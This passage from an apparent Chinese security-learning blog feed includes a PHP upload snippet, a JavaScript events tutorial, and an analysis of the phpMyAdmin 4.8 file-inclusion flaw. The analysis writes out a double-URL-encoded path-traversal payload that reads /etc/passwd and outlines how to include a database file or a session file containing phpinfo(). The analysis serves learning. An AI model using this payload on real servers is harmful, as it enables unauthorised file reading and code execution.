class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击上传"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传后端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file = request()-&gt;file(&apos;file&apos;);</span><br><span class="line">$info = $file-&gt;move(ROOT_PATH.&apos;F:\Project\PHP\test\news_file\tupian&apos;);//图片保存路径 //储存到数据库</span><br><span class="line">if(!$info)&#123;</span><br><span class="line">    $this-&gt;error(&apos;图片上传失败&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一份作业&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>phpMyAdmin4.8文件包含漏洞</title>
    <link href="https://0xxk.github.io/2019/08/11/test/"/>
    <id>https://0xxk.github.io/2019/08/11/test/</id>
    <published>2019-08-11T14:49:49.771Z</published>
    <updated>2019-07-28T08:57:33.796Z</updated>
    
    <content type="html"><![CDATA[<p>  首先来说下文件包含是什么，粗俗的讲就是本网页包含其他源代码来执行。此处本意正如编程中的函数调用，重复的代码大可不写。合理调用利用重复代码才是王道。</p><a id="more"></a><p>那么文件包含漏洞是什么呢？文件包含不该是正常网站的一个功能吗？用尘哥的话说就是xx程序员多了，就有了漏洞，就有了安全这行业。本来应该包含正确代码到文件中去执行的，但是在包含这个地方没有做好过滤。导致我们能让网站随我们心意“任意”执行我们想要做的“事情”。</p><p>  在phpMyadmin4.0 4.1中就有这么一处包含的位置过滤不严导致可控。我们通过文件包含去调用我们“上传”到网站上的恶意代码，如：一句话木马。只要将其包含就可以“执行”。<br>让我们先来认识下PHP中文件包含的函数：</p><p>  include()</p><p>使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行整个php文件。</p><p>  include_once()</p><p>这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下改文件是否被导入。如果已经执行一遍那么就不重复执行了。</p><p>  require()</p><p>使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</p><p>  require_once()</p><p>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p><p>先让我们大致的浏览的一下phpMyadmin网站的结构。既然说是文件包含，那么漏洞点必然在包含的位置那。大致浏览了一波，好像没有找到明显的?xxx=xx.php这种页面。那么直接上手源代码吧，提示漏洞出在index.php中。让我们依次去查找文件包含的关键字：</p><p>  include()</p><p>  <img src="https://b2.bmp.ovh/imgs/2019/07/c808e947e90f8b27.png" alt></p><p>  <img src="https://b2.bmp.ovh/imgs/2019/07/aa9ab63e7f9a8544.png" alt></p><p>  <img src="https://b2.bmp.ovh/imgs/2019/07/8320934fc9a999e3.png" alt></p><p>  <img src="https://b2.bmp.ovh/imgs/2019/07/0674ca60ee73dc17.png" alt><br>  搜索全文后发现只有这四个地方用到了包含include函数.</p><p>include_once()</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/07/de97f23630670e65.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>就只有一处</p><p>require</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/07/53d2315cd601428b.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>就只有这一处</p><p>Require_once</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/07/e54a00ac99cd2747.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>也只有这么一处。<br>因为我们需要被包含文件位置可变（目前非可控）。所以除去所有相对路径后只剩下include中的两处了。<br>分别是：</p><p><img src="https://b2.bmp.ovh/imgs/2019/07/2f5d9f00745ae085.png" alt>    <img src="https://b2.bmp.ovh/imgs/2019/07/58e737094b5b901c.png" alt></p><p>先让我们来分析下include $page的条件（哦吼，php学的烂看不懂。让我百度一波）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/07/9ae651d090d9872c.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>$page中的数值会在函数中判断后由Utile类getScriptNameForOption函数返回值赋予。继续溯源到Util::getScriptNameForOption中去。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/el6bk9.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>查看Util.php源代码，定位到3064行——3110行。代码分别如下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elcU74.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elcgBD.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elcogP.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>总的看了下它共有三个判断语句，如果传入的$location等于server、database、table中的一个。那么就进行swith($target)选择一个值return返回。由此可见，这个包含的地方不是漏洞点。<br>现在只剩下include $_REQUEST[‘target’];了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elcqHg.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>首先对涉及到的函数进行百度（菜是原罪）</p><p>1.empty:若变量已存在、非空字符串或者非零，则返回false值，反之返回true。</p><p>2.is_string:检测变量是否是字符串，如果是字符串返回TURE，反则返回FALSE。</p><p>3.preg_match:用于执行一个正则表达式匹配</p><p>4.in_array:搜索数组中是否存在指定的值。</p><p>5.将target传去Core类的checkPageValidity进行判断。</p><p>如果以上五项都为True，则执行下面的include $_REQUEST[‘target’];</p><p>让我们依次来分析各项为True的条件。</p><p>empty()：要让后面的’target’存在或者是空字符串或者非零。这样empty返回0，和前面的！非一下就成了1.</p><p>is_string：target的数值要为字符串。</p><p>preg_match:如果target满足正则条件则返回1。target字符串的头不能为index，否则！1就返回0。</p><p>in_array:target中的值不能出现在$target_blacklist中。$target_blacklist中有’import.php’和’export.php’。只要’target’中的值不包含’import.php’和’export.php’就可以了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elgibF.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>Core::checkPageValidity：将’target’的值传入core类的checkPageValidity函数中去进行判断。如果返回的数值为True，那么就为1。对Core::checkPageValidity进行溯源：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elU3NT.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>进入Core.php，定位checkPageValidity函数进行判断。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elU84U.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>大致查看下有哪些判断条件，共有五个判断语句。如下逐个分析：</p><p>在这个if中，因为我们没有给whitelist传送一个值过来，所以导致这里empty($whitelist)为True。转而执行下面的$whitelist = self::$goto_whitelist;在slfe::$goto_whitelist中存放着白名单。这里将白名单赋予给$whitelist变量。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/el2GeU.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>goto_whitelist白名单如下（部分）：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elUgvd.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>在这里变量page也就是传入的target要被定义过或是字符串，否则返回false。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elUI58.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>我们传入的变量如果是白名单里的一种，那么就返回true。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elaMxH.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>5.这里用到了mb_substr函数和mb_strpos函数。mb_substr的作用是返回字符串的一部分。mb_strpos这里是判断后面字符出现的位置。这里总的含义就是将变量page里出现在?号前面的数据截取后传入$_page。如下举例：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elaJdP.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elaaRg.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p> 在这里我曾有一个zz的地方，知道mb_strpos函数的作用后不免思考：为什么要加上一个？号后再判断它位置来截断呢？毫无意思的操作，自己加然后截断自己的参数。从而导致我觉得.号作用不是拼接而有其他意思。后来如上图试验后才明白函数原来是从左往后去判断截断的。如果在用户输入有?的前提下将文件名和参数分开，没有?时也可以取出文件名。</p><p>但是在这里有一个问题，正如我们上面使用的语句：<br>db_sql.php?/../../../../../../etc/passwd。它虽然绕过了之前所有的过滤，但是在php中问号后面的是会被当作参数来执行的。那还是达不到包含文件的作用的！继续来看下面的参数！</p><p>5.在这里有一个很有趣的地方，那就是urldecode()。他的作用是将url编码解码一次，那么在这里就很有意思了！</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/ela0Mj.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>它将解码后的在拿去判断，这是无用的！因为php最后包含的是解码之前的代码！如下所示：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elaRWF.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>文件包含的是db_sql.php%3f/../../../../../../etc/passwd，可解码后判断的是db_sql.php?/../../../../../../etc/passwd这是不一样的。这这个if里我们顺利通过了关键字白名单判断且用正确格式包含了自己想要得到的数据。</p><p>综合上面所有的判定条件。我们要通过target参数传入一串字符串，字符串前面的文件名要在白名单中，且？要进行二次url编码（浏览器传送时会自动解码一次）。这样就可以绕过所有的过滤达到我们要的效果了。</p><p>如下所示：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elaTdx.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>因本人很菜，无法在默认配置下利用文件包含漏洞点去拿getshell。至此只写下如何查看phpinfo()。</p><p>一．通过数据库写入phpinfo()从而来包含。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elajQH.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>再来查看当前数据库位置</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/eld3pF.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>具体目录根据保存规则推算。在这里tt.frm得允许其他人可读。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/eldwtK.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>二．第二种方法就是网上常见得包含Php日志。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/07/28/elds6H.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>在这里不需要sess_sxxxx有读权限。因为文件本身的所有者就是apache。二第一种方法之所以要其他人读权限。是因为数据库本身的所有者是apache</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  首先来说下文件包含是什么，粗俗的讲就是本网页包含其他源代码来执行。此处本意正如编程中的函数调用，重复的代码大可不写。合理调用利用重复代码才是王道。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JS事件初识</title>
    <link href="https://0xxk.github.io/2019/08/11/JS%E4%BA%8B%E4%BB%B6/"/>
    <id>https://0xxk.github.io/2019/08/11/JS事件/</id>
    <published>2019-08-11T14:49:49.758Z</published>
    <updated>2019-07-31T16:34:54.482Z</updated>
    
    <content type="html"><![CDATA[<p>  学习了JS后发现自己还有很多很多不会的东西。对于陌生的语言，从基础开始学习是非常有必要的。</p><a id="more"></a><pre><code>但对于快速的课程而言，就此只针对课上出现过的事件进行学习!</code></pre><h1 id="一-getElementById-方法"><a href="#一-getElementById-方法" class="headerlink" title="一.getElementById()方法"></a>一.getElementById()方法</h1><p>  getElementById()方法可返回拥有指定ID的第一个对象的引用。<br>  语法:</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(id)</span><br></pre></td></tr></table></figure><p>  举例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">function getValue()</span><br><span class="line">&#123;</span><br><span class="line">var x=document.getElementById("myHeader")</span><br><span class="line">alert(x.innerHTML)</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"myHeader"</span> <span class="attr">onclick</span>=<span class="string">"getValue()"</span>&gt;</span>这是标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>点击标题，会提示出它的值。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/07/5af51c116a657284.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可以看到代码里监听了”MyHeader”，当id为myHeafer的值被点击时，就触发后面的动作，也就是alert(x.innerHTML)，当我们点击时就触发了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/08/40bb47b4aa5c37d2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h1 id="二-getElementById"><a href="#二-getElementById" class="headerlink" title="二.getElementById"></a>二.getElementById</h1><p>是引用他人再做出动作，但是下面的方法就有些不一样了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>单击按钮创建一个标题<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">function myFunction()&#123;</span><br><span class="line">    var h=document.createElement("H1");</span><br><span class="line">    var t=document.createTextNode("Hello World");</span><br><span class="line">    h.appendChild(t);</span><br><span class="line">    document.body.appendChild(h);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上面的代码里用到了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.getElementByid("myBtn").addEventListener("click",function()</span><br><span class="line">&#123;</span><br><span class="line">document.getElementByld("demo").innerHTML = "Hello World";</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><p>这里的<u>document.getElementByid(“myBtn”).addEventListerner</u> 就不是引用id=myBtn的意思了。作用点在后面的addEventListerner，后面方法的作用是监听前面的id，当点击时满足条件从而去运行下面的函数。在这里有一个新的方法<u>innerHTML</u>。</p><p>innerHTML属性设置或返回表格行的开始和结束标签之间的HTML代码。 在这里的意思就是往前面id为demo的标签中间返回后面的“Hello World”代码。 这里代码的意思就是，当myBtn被点击时，则在demo标签的位置显示Hello World。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/08/538f3ec9b31c35dc.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>同理这里的”click”也可以改为”mousemove”，当移动到这个标签上时触发规则输出Hello World。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/08/2a3da6a042fcdc1c.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h1 id="三-onclick事件"><a href="#三-onclick事件" class="headerlink" title="三.onclick事件"></a>三.onclick事件</h1><p>在这里出现了新的句子。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">function myFunction()&#123;</span><br><span class="line">    document.getElementById("demo").innerHTML="Hello World";</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>单击按钮触发函数。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在这里出现了一个</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p><button>是一个按钮标签。</button></p><p>一般来说这里我们都是些一个id去指定这个按钮。但是这里没有，当我们点击按钮后，这里直接通过onclick事件跳转了。他跳到了onclick=”myFunction()”后面的myFunction()函数处。</p><p>在函数中出现了另一个事件。通过引用”demo”这个标签，在ta的html范围内输出“Hello World”。从而这段代码的意思就是当我们点击按钮后在demo的代码范围内输出Hello World。</p><h1 id="四-创建节点"><a href="#四-创建节点" class="headerlink" title="四.创建节点"></a>四.创建节点</h1><p>下面的js代码是单击按钮将项目添加到列表中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"myList"</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Tea<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>单击按钮将项目添加到列表中<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">function myFunction()&#123;</span><br><span class="line">    var node=document.createElement("LI");</span><br><span class="line">    var textnode=document.createTextNode("Water");</span><br><span class="line">    node.appendChild(textnode);</span><br><span class="line">    document.getElementById("myList").appendChild(node);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>注意:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>首先创建一个节点，<span class="tag">&lt;<span class="name">br</span>&gt;</span> 然后创建一个文本节点，<span class="tag">&lt;<span class="name">br</span>&gt;</span>然后将文本节点添加到LI节点上。<span class="tag">&lt;<span class="name">br</span>&gt;</span>最后将节点添加到列表中。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>每点击一次“点我”，就在列表中增加一个值。</p><p> <img src="https://b2.bmp.ovh/imgs/2019/08/02b7bcaccb7f404e.png" alt></p><p>上面的代码执行顺序如下：        </p><p>首先创建一个Li节点，然后创建一个文本节点，然后将文本节点增加到LI节点上。最后将节点增加到列表中。        </p><p>createElement就是创建一个节点，createTextNode就是创建一个文本节点，appendChild就是将textnode（创建文本节点）加入到node(创建的节点)中去。       </p><p>最后引用”myList” id，appendChild(node)将node(节点和文本节点的结合体)加入到<ul>标签中去。</ul></p><h1 id="五-createElement-AND-createTextNode"><a href="#五-createElement-AND-createTextNode" class="headerlink" title="五.createElement AND createTextNode"></a>五.createElement AND createTextNode</h1><p>继上一个onclick事件之后扩展出另外一个程序。如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>单击按钮创建一个标题<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">function myFunction()&#123;</span><br><span class="line">    var h=document.createElement("H1");</span><br><span class="line">    var t=document.createTextNode("Hello World");</span><br><span class="line">    h.appendChild(t);</span><br><span class="line">    document.body.appendChild(h);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里出现了新的事件createElement()，createTextNode()。    </p><p>createrElement()的作用是创建一个”H1”节点（字体大小），然后createTextNode(“Hello World”)创建一个对象。h.appendChild(t)将t”Hello World”加入加入“H1”中(字体也会相应的变最大)。最后将h对象加入body的最后面。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b2.bmp.ovh/imgs/2019/08/e064d6cc8b8e8685.png" alt title>                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  学习了JS后发现自己还有很多很多不会的东西。对于陌生的语言，从基础开始学习是非常有必要的。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP代码练习</title>
    <link href="https://0xxk.github.io/2019/08/07/PHP%E4%BB%A3%E7%A0%81%E7%BB%83%E4%B9%A0/"/>
    <id>https://0xxk.github.io/2019/08/07/PHP代码练习/</id>
    <published>2019-08-07T09:06:28.000Z</published>
    <updated>2019-08-13T14:16:39.273Z</updated>
    
